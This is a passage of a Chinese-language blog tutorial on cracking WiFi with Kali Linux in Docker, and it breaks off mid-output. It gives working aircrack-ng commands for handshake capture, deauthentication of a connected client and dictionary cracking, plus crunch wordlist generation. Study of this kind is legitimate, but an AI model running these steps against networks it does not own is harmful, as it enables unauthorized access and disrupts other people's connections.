@@ -1,0 +1,526 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 8.1.1">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/favicon.ico">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:ital,wght@0,300;0,400;0,700;1,300;1,400;1,700&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/purple/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous" defer></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"www.drunkdream.com","root":"/","images":"/images","scheme":"Pisces","darkmode":true,"version":"8.27.0","exturl":false,"sidebar":{"position":"rights","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"xcode","dark":"github-dark-dimmed"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"language":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="0x00 前言Kali是一款常用于渗透测试的Linux发行版，集成了较多的安全工具。本文尝试使用Docker安装Kali，并进行Wifi的破解工作。 本文仅做技术研究，请勿用于非法用途。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="使用Kali系统进行无线网络破解">
+<meta property="og:url" content="https://www.drunkdream.com/2022/05/22/kali-wifi-cracking/index.html">
+<meta property="og:site_name" content="醉梦轩">
+<meta property="og:description" content="0x00 前言Kali是一款常用于渗透测试的Linux发行版，集成了较多的安全工具。本文尝试使用Docker安装Kali，并进行Wifi的破解工作。 本文仅做技术研究，请勿用于非法用途。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-05-22T06:04:13.000Z">
+<meta property="article:modified_time" content="2026-02-23T06:02:24.954Z">
+<meta property="article:author" content="drunkdream">
+<meta property="article:tag" content="Kali">
+<meta property="article:tag" content="Wifi">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://www.drunkdream.com/2022/05/22/kali-wifi-cracking/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://www.drunkdream.com/2022/05/22/kali-wifi-cracking/","path":"2022/05/22/kali-wifi-cracking/","title":"使用Kali系统进行无线网络破解"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>使用Kali系统进行无线网络破解 | 醉梦轩</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script size="300" alpha="0.6" zIndex="-1" src="https://cdnjs.cloudflare.com/ajax/libs/ribbon.js/1.0.2/ribbon.min.js" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+  <script src="/js/third-party/pace.js" defer></script>
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">醉梦轩</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">醉中无日月，梦里有乾坤</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E5%9C%A8Docker%E4%B8%AD%E5%AE%89%E8%A3%85Kali%E7%B3%BB%E7%BB%9F"><span class="nav-number">2.</span> <span class="nav-text">0x01 在Docker中安装Kali系统</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-Wifi%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3"><span class="nav-number">3.</span> <span class="nav-text">0x02 Wifi密码破解</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E7%A0%B4%E8%A7%A3WPS-PIN%E7%A0%81"><span class="nav-number">4.</span> <span class="nav-text">0x03 破解WPS PIN码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E7%BD%91%E7%BB%9C%E6%B5%81%E9%87%8F%E5%97%85%E6%8E%A2"><span class="nav-number">5.</span> <span class="nav-text">0x04 网络流量嗅探</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-%E7%A0%B4%E8%A7%A3%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AF%86%E7%A0%81"><span class="nav-number">6.</span> <span class="nav-text">0x05 破解路由器密码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-%E6%80%BB%E7%BB%93"><span class="nav-number">7.</span> <span class="nav-text">0x06 总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE"><span class="nav-number">8.</span> <span class="nav-text">0x07 参考文献</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="drunkdream"
+      src="/images/logo.gif">
+  <p class="site-author-name" itemprop="name">drunkdream</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">84</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">69</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://www.drunkdream.com/2022/05/22/kali-wifi-cracking/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/logo.gif">
+      <meta itemprop="name" content="drunkdream">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="醉梦轩">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="使用Kali系统进行无线网络破解 | 醉梦轩">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          使用Kali系统进行无线网络破解
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-05-22 14:04:13" itemprop="dateCreated datePublished" datetime="2022-05-22T14:04:13+08:00">2022-05-22</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-02-23 14:02:24" itemprop="dateModified" datetime="2026-02-23T14:02:24+08:00">2026-02-23</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Linux/" itemprop="url" rel="index"><span itemprop="name">Linux</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>Kali是一款常用于渗透测试的Linux发行版，集成了较多的安全工具。本文尝试使用Docker安装Kali，并进行Wifi的破解工作。</p>
+<p>本文仅做技术研究，请勿用于非法用途。</p>
+<span id="more"></span>
+
+<h2 id="0x01-在Docker中安装Kali系统"><a href="#0x01-在Docker中安装Kali系统" class="headerlink" title="0x01 在Docker中安装Kali系统"></a>0x01 在Docker中安装Kali系统</h2><p>Kali官方提供了Docker镜像：<code>kalilinux/kali-last-release</code>。但是这个镜像基本没有包含任何工具，如果要安装全部工具，镜像大小会超过<code>4G</code>。很明显，不是所有人都需要这么多工具。因此，用户可以根据用途，通过编写<code>Dockerfile</code>定制不同的Kali镜像。</p>
+<p>对于Wifi破解，可以编写以下Dockerfile。</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> kalilinux/kali-last-release</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt update &amp;&amp; apt install -y pciutils net-tools procps crunch wordlists aircrack-ng reaver</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /root/workspace</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">sudo</span> docker build -t kali .</span><br><span class="line">$ <span class="built_in">sudo</span> docker run -it --net=<span class="string">&quot;host&quot;</span> --privileged -v $(<span class="built_in">pwd</span>)/workspace:/root/workspace kali</span><br><span class="line">┌──(root㉿drunkdream-LB0)-[~/workspace]</span><br><span class="line">└─#</span><br></pre></td></tr></table></figure>
+
+<p>运行时网络需要使用<code>host</code>模式，这样才能访问母机上的无线网卡，同时开启特权模式；为了数据可以持久化存储，可以将本地目录挂载到容器中。</p>
+<p>后面所有的操作都是在此容器中进行。</p>
+<h2 id="0x02-Wifi密码破解"><a href="#0x02-Wifi密码破解" class="headerlink" title="0x02 Wifi密码破解"></a>0x02 Wifi密码破解</h2><p>这里主要使用<code>aircrack-ng</code>系列命令进行Wifi密码破解。</p>
+<ul>
+<li>获取无线网卡列表</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">└─# airmon-ng                                                                                                  </span><br><span class="line">Your kernel has module support but you don<span class="string">&#x27;t have modprobe installed.</span></span><br><span class="line"><span class="string">It is highly recommended to install modprobe (typically from kmod).</span></span><br><span class="line"><span class="string">Your kernel has module support but you don&#x27;</span>t have modinfo installed.</span><br><span class="line">It is highly recommended to install modinfo (typically from kmod).</span><br><span class="line">Warning: driver detection without modinfo may yield inaccurate results.</span><br><span class="line"></span><br><span class="line">PHY     Interface       Driver          Chipset</span><br><span class="line"></span><br><span class="line">phy0    wlp0s20f3       iwlwifi         Intel Corporation Comet Lake PCH CNVi WiFi</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>开启监听模式</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">└─# airmon-ng start wlp0s20f3</span><br><span class="line"></span><br><span class="line">Your kernel has module support but you don<span class="string">&#x27;t have modprobe installed.</span></span><br><span class="line"><span class="string">It is highly recommended to install modprobe (typically from kmod).</span></span><br><span class="line"><span class="string">Your kernel has module support but you don&#x27;</span>t have modinfo installed.</span><br><span class="line">It is highly recommended to install modinfo (typically from kmod).</span><br><span class="line">Warning: driver detection without modinfo may yield inaccurate results.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PHY     Interface       Driver          Chipset</span><br><span class="line"></span><br><span class="line">phy0    wlp0s20f3       iwlwifi         Intel Corporation Comet Lake PCH CNVi WiFi</span><br><span class="line">                (mac80211 monitor mode vif enabled <span class="keyword">for</span> [phy0]wlp0s20f3 on [phy0]wlp0s20f3mon)</span><br><span class="line">                (mac80211 station mode vif disabled <span class="keyword">for</span> [phy0]wlp0s20f3)</span><br></pre></td></tr></table></figure>
+
+<p>此时母机系统中已经无法看到这个无线网卡了，相反多了一个<code>wlp0s20f3mon</code>设备。</p>
+<ul>
+<li>扫描无线网络</li>
+</ul>
+<blockquote>
+<p>此时的网卡名需要在后面加上<code>mon</code></p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">└─# airodump-ng wlp0s20f3mon</span><br><span class="line">Warning: Detected you are using a non-UNICODE terminal character encoding.</span><br><span class="line"></span><br><span class="line"> CH 11 ][ Elapsed: 24 s ][ 2022-05-22 15:36                                                                    </span><br><span class="line">                                                                                                               </span><br><span class="line"> BSSID              PWR  Beacons    <span class="comment">#Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID                               </span></span><br><span class="line">                </span><br><span class="line"> 74:CF:00:DA:F4:40  -11       15        0    0   2  130   WPA2 CCMP   PSK  CMCC-X5qG                         </span><br><span class="line"> 8C:53:C3:C8:16:E6  -13       18        4    0   1  130   WPA2 CCMP   PSK  Xiaomi_16E4</span><br></pre></td></tr></table></figure>
+
+<p>通过这个命令，可以获取到附近的Wifi列表。</p>
+<ul>
+<li>抓取握手数据包</li>
+</ul>
+<p>用法: <code>airodump-ng -c &lt;无线信道&gt; --bssid &lt;目标无线AP的硬件地址&gt; -w &lt;扫描结果保存文件名&gt; &lt;处于监听模式的网卡名称&gt;</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">└─# airodump-ng -c 2 --bssid 74:CF:00:DA:F4:40 -w dump wlp0s20f3mon</span><br><span class="line"> CH  2 ][ Elapsed: 18 s ][ 2022-05-22 16:04 ][ WPA handshake: 74:CF:00:DA:F4:40</span><br><span class="line">                                                                                                               </span><br><span class="line"> BSSID              PWR RXQ  Beacons    <span class="comment">#Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID                           </span></span><br><span class="line">                                                                                                               </span><br><span class="line"> 74:CF:00:DA:F4:40  -13 100      215       15    0   2  130   WPA2 CCMP   PSK  CMCC-X5qG                      </span><br><span class="line">                                                                                           </span><br><span class="line"> BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes                             </span><br><span class="line">                                                                                                               </span><br><span class="line"> 74:CF:00:DA:F4:40  1C:2A:DB:0E:D5:AC  -29   6e- 6e  1921    478     EAPOL  drunkdream</span><br></pre></td></tr></table></figure>
+
+<p>使用这条命令可以获取连接到指定Wifi的客户端列表。当抓取到<code>握手包</code>时，会提示<code>WPA handshake: 74:CF:00:DA:F4:40</code>这样的字符串，就可以停止数据抓取了。此时，数据包会保存到当前目录下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ls -l | grep dump</span></span><br><span class="line">-rwxrwxrwx 1 1000 1000      225870 May 22 23:30 dump-01.cap</span><br><span class="line">-rwxrwxrwx 1 1000 1000         883 May 22 23:30 dump-01.csv</span><br><span class="line">-rwxrwxrwx 1 1000 1000         601 May 22 23:30 dump-01.kismet.csv</span><br><span class="line">-rwxrwxrwx 1 1000 1000        7330 May 22 23:30 dump-01.kismet.netxml</span><br><span class="line">-rwxrwxrwx 1 1000 1000       92078 May 22 23:30 dump-01.log.csv</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>让客户端掉线重连</li>
+</ul>
+<p>如果客户端一直正常连接，是很难抓取到握手包的。此时需要将客户端踢下线：</p>
+<p>用法: <code>aireplay-ng -&lt;攻击模式(0)&gt;  &lt;攻击次数(10)&gt; -a &lt;无线AP硬件地址&gt; -c &lt;用户设备硬件地址&gt; &lt;处于监听模式的网卡名称&gt;</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">└─# aireplay-ng -02 -a 74:CF:00:DA:F4:40 -c 1C:2A:DB:0E:D5:AC wlp0s20f3mon</span><br><span class="line">16:11:07  Waiting <span class="keyword">for</span> beacon frame (BSSID: 74:CF:00:DA:F4:40) on channel 2</span><br><span class="line">16:11:07  Sending 64 directed DeAuth (code 7). STMAC: [1C:2A:DB:0E:D5:AC] [ 0| 2 ACKs]                         </span><br><span class="line">16:11:08  Sending 64 directed DeAuth (code 7). STMAC: [1C:2A:DB:0E:D5:AC] [ 4|197 ACKs]</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>执行此操作时需要保证上一步骤的命令同时在执行。</p>
+</blockquote>
+<ul>
+<li>停止监听网卡</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">└─# airmon-ng stop wlp0s20f3mon</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>破解Wifi密码</li>
+</ul>
+<p>抓取到握手包的<code>cap</code>文件后，就可以离线破解Wifi密码了。比如使用性能较好的机器或是分布式方式进行破解。</p>
+<p>用法: <code>aircrack-ng -w 密码字典 &lt;包含握手包的cap文件&gt;</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">└─# aircrack-ng -a2 -b 74:CF:00:DA:F4:40 -w password.dict dump-01.cap</span><br><span class="line">Reading packets, please <span class="built_in">wait</span>...</span><br><span class="line">Opening dump-01.cap</span><br><span class="line">Read 1734 packets.</span><br><span class="line"></span><br><span class="line">1 potential targets</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                         Aircrack-ng 1.6 </span><br><span class="line"></span><br><span class="line">      [00:00:00] 3/5 keys tested (71.89 k/s) </span><br><span class="line"></span><br><span class="line">      Time left: 0 seconds                                      60.00%</span><br><span class="line"></span><br><span class="line">                         KEY FOUND! [ 12345678 ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      Master Key     : 1E 30 C1 07 43 14 93 F2 74 D3 6D 8E F3 E2 E1 07 </span><br><span class="line">                       18 4C 47 01 1F 87 D6 87 A7 0A 49 01 C0 24 F5 A1 </span><br><span class="line"></span><br><span class="line">      Transient Key  : C4 D6 53 3B DA C8 D4 23 D5 7D 82 EE 73 67 7D 3D </span><br><span class="line">                       6B 6B 04 BF B1 66 29 74 3E E1 CB FD 8C 90 6B E8 </span><br><span class="line">                       DE 0D 8C 32 21 3E 8E F0 9D 1A 2B 76 BB 0E 3E FD </span><br><span class="line">                       EB 95 8C 7D C0 43 90 12 4E 3D A4 A5 F2 75 CF FF </span><br><span class="line"></span><br><span class="line">      EAPOL HMAC     : 21 B2 AA 47 4F AB E3 77 53 24 73 21 7E 06 78 10</span><br></pre></td></tr></table></figure>
+
+<p><code>password.dict</code>是密码字典，能否破解出密码取决于密码是否包含在字典中。因此，对于过于复杂的密码，破解成功率会非常低。</p>
+<ul>
+<li>生成密码字典</li>
+</ul>
+<p>为了提升破解成功率，需要根据具体场景生成有针对性的密码字典，例如：生日、手机号等。这里使用<code>crunch</code>命令来生成密码字典。</p>
+<p>使用语法和参数:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">crunch</span><br><span class="line"></span><br><span class="line">[options]</span><br><span class="line"></span><br><span class="line">min 设定最小字符串长度(必选)</span><br><span class="line">max 设定最大字符串长度(必选)</span><br><span class="line"></span><br><span class="line">-b 指定文件输出的大小，避免字典文件过大</span><br><span class="line">-c 指定文件输出的行数，即包含密码的个数</span><br><span class="line">-d 限制相同元素出现的次数</span><br><span class="line">-e 定义停止字符，即到该字符串就停止生成</span><br><span class="line">-f 调用库文件(/etc/share/crunch/charset.lst)</span><br><span class="line">-i 改变输出格式，即aaa,aab -&gt; aaa,baa</span><br><span class="line">-I 通常与-t联合使用，表明该字符为实义字符</span><br><span class="line">-m 通常与-p搭配</span><br><span class="line">-o 将密码保存到指定文件</span><br><span class="line">-p 指定元素以组合的方式进行</span><br><span class="line">-q 读取密码文件，即读取pass.txt</span><br><span class="line">-r 定义重某一字符串重新开始</span><br><span class="line">-s 指定一个开始的字符，即从自己定义的密码xxxx开始</span><br><span class="line">-t 指定密码输出的格式</span><br><span class="line">-u 禁止打印百分比(必须为最后一个选项)</span><br><span class="line">-z 压缩生成的字典文件，支持gzip,bzip2,lzma,7z</span><br><span class="line"></span><br><span class="line">特殊字符</span><br><span class="line">% 代表数字</span><br><span class="line">^ 代表特殊符号</span><br><span class="line">@ 代表小写字母</span><br><span class="line">, 代表大写字符</span><br></pre></td></tr></table></figure>
+
+<p>使用示例——生成136开头的所有手机号：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">└─# crunch 11 11 -t 136%%%%%%%% -o 136.txt</span><br><span class="line">Crunch will now generate the following amount of data: 1200000000 bytes</span><br><span class="line">1144 MB</span><br><span class="line">1 GB</span><br><span class="line">0 TB</span><br><span class="line">0 PB</span><br><span class="line">Crunch will now generate the following number of lines: 100000000 </span><br><span class="line"></span><br><span class="line">crunch:   7% completed generating output</span><br><span class="line">crunch:  15% completed generating output</span><br><span class="line">crunch:  22% completed generating output</span><br><span class="line">crunch:  29% completed generating output</span><br><span class="line">crunch:  36% completed generating output</span><br><span class="line">crunch:  43% completed generating output</span><br><span class="line">crunch:  51% completed generating output</span><br><span class="line">crunch:  58% completed generating output</span><br><span class="line">crunch:  65% completed generating output</span><br><span class="line">crunch:  72% 